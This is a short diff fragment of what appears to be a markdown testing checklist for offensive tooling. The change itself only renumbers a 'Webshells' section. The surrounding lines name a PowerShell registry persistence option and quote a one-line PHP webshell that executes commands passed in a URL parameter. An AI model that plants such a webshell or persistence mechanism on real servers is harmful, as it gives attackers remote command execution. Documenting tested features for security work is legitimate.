@@ -125,7 +125,7 @@ Registry persistence option (New-UserPersistenceOption -Registry -AtLogon)
 **Screenshots:**
 
 ---
-### 4. Webshells
+### 5. Webshells
 **Features tested:**
 
 Simple PHP webshell execution (<?php system($_GET["cmd"]); ?>)
